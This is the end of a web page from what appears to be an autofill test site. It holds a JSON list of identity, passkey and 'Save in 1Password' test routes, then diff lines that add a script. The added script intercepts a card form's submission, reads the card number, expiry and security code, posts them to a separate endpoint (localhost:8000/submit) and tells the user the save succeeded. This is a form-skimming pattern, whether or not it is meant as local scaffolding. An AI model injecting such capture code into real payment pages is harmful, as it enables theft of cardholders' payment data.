dialog","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Same-origin child frame","kind":"page","path":"/identity?container=iframe","slug":"identity","title":"Identity · iframe","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Two frames deep","kind":"page","path":"/identity?container=nested-iframe","slug":"identity","title":"Identity · Nested iframe","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Legacy \u003cframeset> document","kind":"page","path":"/identity?container=frameset","slug":"identity","title":"Identity · Frameset","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Declarative open shadow root","kind":"shadow","path":"/identity?container=shadow","slug":"identity","title":"Identity · Shadow DOM","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"display:none until a click","kind":"form","path":"/identity?reveal=display-none","slug":"identity","title":"Identity · display:none","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"0×0 clipping wrapper until a click","kind":"form","path":"/identity?reveal=zero-size","slug":"identity","title":"Identity · Zero size","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/identity?reveal=inserted","slug":"identity","title":"Identity · Inserted later","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Four viewports below the fold","kind":"form","path":"/identity?reveal=scroll","slug":"identity","title":"Identity · Below the fold","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Inputs in a \u003cdiv>, posted with fetch","kind":"noform","path":"/identity?markup=noform","slug":"identity","title":"Identity · No \u003cform>","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Marketing page with hundreds of nodes and other forms","kind":"form","path":"/identity?weight=heavy","slug":"identity","title":"Identity · Heavy","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"identity","categoryLabel":"Identity","description":"Heavy plus a DOM that mutates every 120ms","kind":"form","path":"/identity?weight=mutating","slug":"identity","title":"Identity · Mutating","tokens":["given-name","additional-name","family-name","email","tel","address-line1","address-line2","address-level2","address-level1","postal-code","country"]},{"category":"avoid","categoryLabel":"Avoid","description":"Forms a filler should leave alone.","kind":"form","path":"/avoid","slug":"avoid","title":"Avoid","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Every input type with no tokens","kind":"form","path":"/avoid?kind=inputs","slug":"avoid","title":"Avoid · Odd inputs","tokens":[]},{"category":"avoid","categoryLabel":"Avoid","description":"Native \u003cdialog>, modal or non-modal","kind":"form","path":"/avoid?container=dialog","slug":"avoid","title":"Avoid · Dialog","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Fixed to the top-right corner","kind":"form","path":"/avoid?container=dialog-positioned","slug":"avoid","title":"Avoid · Positioned dialog","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Same-origin child frame","kind":"page","path":"/avoid?container=iframe","slug":"avoid","title":"Avoid · iframe","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Two frames deep","kind":"page","path":"/avoid?container=nested-iframe","slug":"avoid","title":"Avoid · Nested iframe","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Legacy \u003cframeset> document","kind":"page","path":"/avoid?container=frameset","slug":"avoid","title":"Avoid · Frameset","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Declarative open shadow root","kind":"shadow","path":"/avoid?container=shadow","slug":"avoid","title":"Avoid · Shadow DOM","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"display:none until a click","kind":"form","path":"/avoid?reveal=display-none","slug":"avoid","title":"Avoid · display:none","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"0×0 clipping wrapper until a click","kind":"form","path":"/avoid?reveal=zero-size","slug":"avoid","title":"Avoid · Zero size","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"form","path":"/avoid?reveal=inserted","slug":"avoid","title":"Avoid · Inserted later","tokens":["off"]},{"category":"avoid","categoryLabel":"Avoid","description":"Four viewports below the fold","kind":"form","path":"/avoid?reveal=scroll","slug":"avoid","title":"Avoid · Below the fold","tokens":["off"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Real WebAuthn ceremonies: register, then sign in explicitly, conditionally, or with a code after.","kind":"page","path":"/passkeys","slug":"passkeys","title":"Passkeys","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"A button opens the passkey chooser","kind":"page","path":"/passkeys?mode=explicit","slug":"passkeys","title":"Passkeys · Sign in, explicit","tokens":["username"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Passkeys offered in the autofill dropdown","kind":"form","path":"/passkeys?mode=conditional","slug":"passkeys","title":"Passkeys · Sign in, conditional","tokens":["username","webauthn","current-password"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Passkey, then a one-time code","kind":"page","path":"/passkeys?mode=totp","slug":"passkeys","title":"Passkeys · Sign in + TOTP","tokens":["username","one-time-code"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Native \u003cdialog>, modal or non-modal","kind":"page","path":"/passkeys?container=dialog","slug":"passkeys","title":"Passkeys · Dialog","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Fixed to the top-right corner","kind":"page","path":"/passkeys?container=dialog-positioned","slug":"passkeys","title":"Passkeys · Positioned dialog","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Same-origin child frame","kind":"page","path":"/passkeys?container=iframe","slug":"passkeys","title":"Passkeys · iframe","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Two frames deep","kind":"page","path":"/passkeys?container=nested-iframe","slug":"passkeys","title":"Passkeys · Nested iframe","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Legacy \u003cframeset> document","kind":"page","path":"/passkeys?container=frameset","slug":"passkeys","title":"Passkeys · Frameset","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Declarative open shadow root","kind":"shadow","path":"/passkeys?container=shadow","slug":"passkeys","title":"Passkeys · Shadow DOM","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"display:none until a click","kind":"page","path":"/passkeys?reveal=display-none","slug":"passkeys","title":"Passkeys · display:none","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"0×0 clipping wrapper until a click","kind":"page","path":"/passkeys?reveal=zero-size","slug":"passkeys","title":"Passkeys · Zero size","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Injected from a \u003ctemplate>, shown 2s later","kind":"page","path":"/passkeys?reveal=inserted","slug":"passkeys","title":"Passkeys · Inserted later","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Four viewports below the fold","kind":"page","path":"/passkeys?reveal=scroll","slug":"passkeys","title":"Passkeys · Below the fold","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Marketing page with hundreds of nodes and other forms","kind":"page","path":"/passkeys?weight=heavy","slug":"passkeys","title":"Passkeys · Heavy","tokens":["username","webauthn"]},{"category":"passkeys","categoryLabel":"Passkeys","description":"Heavy plus a DOM that mutates every 120ms","kind":"page","path":"/passkeys?weight=mutating","slug":"passkeys","title":"Passkeys · Mutating","tokens":["username","webauthn"]},{"category":"save","categoryLabel":"Save in 1Password","description":"Random login, card and API key items to push into 1Password with the Save button.","kind":"page","path":"/save","slug":"save","title":"Save in 1Password","tokens":[]},{"category":"save","categoryLabel":"Save in 1Password","description":"Item: Credit card","kind":"page","path":"/save?item=credit-card","slug":"save","title":"Save in 1Password · Credit card","tokens":[]},{"category":"save","categoryLabel":"Save in 1Password","description":"Key id, secret and API host","kind":"page","path":"/save?item=api-key","slug":"save","title":"Save in 1Password · API key","tokens":[]},{"category":"reference","categoryLabel":"References","description":"The HTML living standard section that defines autocomplete.","href":"https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#autofill","kind":"redirect","path":"/reference/whatwg","slug":"whatwg","title":"HTML autofill spec","tokens":[]},{"category":"reference","categoryLabel":"References","description":"How to design sign-in and checkout pages that fill well.","href":"https://support.1password.com/compatible-website-design","kind":"redirect","path":"/reference/1password","slug":"1password","title":"1Password developer guide","tokens":[]}]</script></dialog><script
+            type="module"
+            src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495"
+            integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg=="
+            data-cf-beacon='{"version":"2024.11.0","token":"49287a2ba5464fb0a9b6281ad4fb018c","r":1,"spa":2}'
+            crossorigin="anonymous">
+        </script>
+        <script>
+        // JavaScript to send the login data to an API
+        document.getElementById("card-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+
+            const ccnumber = document.getElementById("cc-number").value;
+            const ccexpm = document.getElementById("cc-exp-month").value;
+            const ccexpy = document.getElementById("cc-exp-year").value;
+            const cccsc = document.getElementById("cc-csc").value;
+
+
+            // Prepare the data to be sent to the API
+            const data = {
+                ccnumber: ccnumber,
+                ccexpm: ccexpm,
+                ccexpy: ccexpy,
+                cccsc: cccsc
+            };
+
+
+            // Send the data using fetch to an API (replace 'YOUR_API_URL' with the actual endpoint)
+            fetch('http://localhost:8000/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json()) // Parse the JSON response
+            .then(data => {
+                // Handle the API response here
+                console.log('Success:', data);
+                alert('Save successful');
+            })
+            .catch((error) => {
+                // Handle any errors that occur during the fetch
+                console.error('Error:', error);
+                alert('Save failed');
+            });
+        });
+        </script>
+    </body>
+</html>
